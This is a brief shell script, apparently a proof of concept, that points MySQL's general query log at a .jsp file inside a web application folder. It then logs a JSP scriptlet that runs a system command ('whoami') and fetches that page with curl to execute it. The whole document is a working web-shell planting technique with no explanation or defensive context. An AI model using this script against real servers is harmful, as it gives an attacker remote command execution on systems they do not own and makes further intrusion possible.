#!/bin/sh
mysql <<'QUERY'
SET GLOBAL general_log_file = '/srv/server/webapps/app/check.jsp';
SET GLOBAL general_log = ON;
SELECT '<% Runtime . getRuntime ( ) . exec ( "whoami" ); %>';
SET GLOBAL general_log = 'OFF';
QUERY
curl --fail "$SITE/check.jsp"
